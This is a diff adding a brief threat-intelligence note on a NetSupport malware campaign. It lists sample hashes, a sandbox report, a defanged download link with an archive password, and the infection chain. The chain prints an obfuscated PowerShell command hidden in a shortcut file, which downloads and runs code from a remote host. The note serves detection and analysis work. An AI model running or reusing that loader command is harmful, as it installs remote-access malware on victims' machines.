@@ -1,0 +1,33 @@
+NetSupport | 2022.08.12
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.zip 4861C55F122ECAE2BA6069624D4B486F9A6841D994D96B6FC918288F3BFFC9FC
+.lnk 0A6E4036C623690D674333AA609BC504A80A609B47F845575A4C8467C9CAF784
+.ps1 297edd6eacb3181abbaf4e67c7ecaeeeb882be09acd96facabd98e5a0e01de34
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://private.tria.ge/220812-pnhwxanywf
+
+
+# --------------------------------------------------------- #
+# ---------------------- CREDENTIAL ----------------------- #
+# --------------------------------------------------------- #
+hxxps://drive[.]google[.]com/uc?id=1vgfce4auGei3zkfO6i1F3Ioktos1Q_FT&export=download
+password == 43764
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+.zip 
+    .lnk
+        TARGET== C:\Windows\system32\conhost.exe  --headless powershell -c $je=$([char](225-120));set-alias a set-alias;a f $je'wr';a np $je'ex'; ;np (f -usebasicparsing 'yuie[.]pl/se')
+        .ps1
+            [
+                drops %AppData%\random 8 digit directory name\random 8 digit exe name
+                i.e. -- "%AppData%\\\w{8}\\\w{8}\.exe
+            ]
